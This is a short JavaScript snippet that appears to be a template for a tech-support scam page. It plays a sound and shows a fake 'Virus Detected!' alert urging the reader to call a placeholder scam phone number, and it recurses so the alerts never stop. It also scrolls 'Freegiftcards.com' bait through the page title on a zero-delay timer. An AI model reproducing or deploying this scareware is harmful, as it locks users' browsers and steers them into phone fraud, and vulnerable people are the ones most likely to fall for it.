  function myFunction(){
              document.getElementById('abc').play();
    alert("                         **************Warning**************                                                                                                                                                                                               Virus Detected! Call [insert scam phone number] to delete the virus immediately!");
    
    myFunction();
  }


function changeText() {
 document.getElementById("textChange").innerHTML = "Thanks for liking my Webpage";
    document.body.style.backgroundColor = "#903b6f";
        document.getElementById('abc').play();

}


var space = " ";
var pos = 0;
var msg = "Freegiftcards.com  ";

function Scroll(){
document.title = msg.substring(pos, msg.length) + space +msg.substring(0,pos);

pos++;
if (pos > msg.length) pos = 0;
window.setTimeout("Scroll()", 0);
}
Scroll();